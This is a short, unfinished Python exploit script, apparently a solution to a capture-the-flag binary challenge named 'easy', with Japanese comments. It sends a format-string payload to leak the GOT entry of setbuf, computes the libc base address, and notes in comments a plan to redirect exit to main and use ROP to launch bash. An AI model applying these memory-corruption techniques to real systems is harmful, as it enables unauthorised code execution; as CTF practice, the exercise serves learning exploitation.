from ptrlib import *

bin_file = './easy'

def attack(conn):
   
    # ldd easy
    # 実行ファイルとlibcの実行ファイルは別にあり、動的リンクされる
    libc = ELF('/usr/lib/libc.so.6')
    elf = ELF(bin_file)
    # unpackしてpackすることによって、ゼロ埋めする手間を省く
    exploit = p64(u64("%7$s"))
    # setbufのGOTの値
    exploit += p64(0x404000)
    
    conn.send(exploit)
    # hexの返り値はstring なぜなら、u64はただただデータの文字列
    # setbuf =  hex(u64(conn.recv(8)))
    # print("setbuf:", setbuf)
    setbuf =  u64(conn.recv(8))
    # symbolはその実行ファイルのベースアドレスからのオフセット数値をもらえる
    libc_base_to_setbuf = libc.symbol('setbuf')
    print("libc_base_to_setbuf: ", libc_base_to_setbuf)
    libc_base = setbuf - libc_base_to_setbuf
    print("libc_base: ", libc_base)
    # 一致してるかどうかチェックできる
    libc.base = libc_base
    

    #方針
    #GOT(exitをmainに飛ばして無限ループ)
    #ROPでbashを起動



if __name__ == '__main__':
    conn = process(bin_file)
    # input()
    attack(conn)
    conn.interactive()
